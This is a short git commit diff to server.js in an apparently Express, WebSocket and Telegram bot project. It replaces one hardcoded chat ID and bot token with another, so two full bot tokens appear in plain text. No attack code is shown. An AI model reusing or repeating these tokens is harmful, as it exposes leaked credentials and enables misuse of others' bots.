1ebf7ce89bf367cf9eaa37546963945e893d54c5
sjsksuxyhsbs <sell.accaunt.sell@gmail.com>
2025-02-09 18:18:53 +0200

    Update server.js

--- server.js
+++ server.js
@@ -5,8 +5,8 @@ const app = express()
 app.use(bodyParser.json());
 const server = http.createServer(app);
 const wss = new socket.Server({server});
-const chatId = '5265371934'
-const token = '5171666407:AAFbQ6iLPo2r9DazrMN9sPhtYdWLy_uxGf8'
+const chatId = '6041873385'
+const token = '7405945177:AAHHnmK4VbdLX60pKMdWaeRvJkjM1U8TTjE'
 const serverAddr = ''
 const bot = new TelegramBot(token, {polling: true});
 
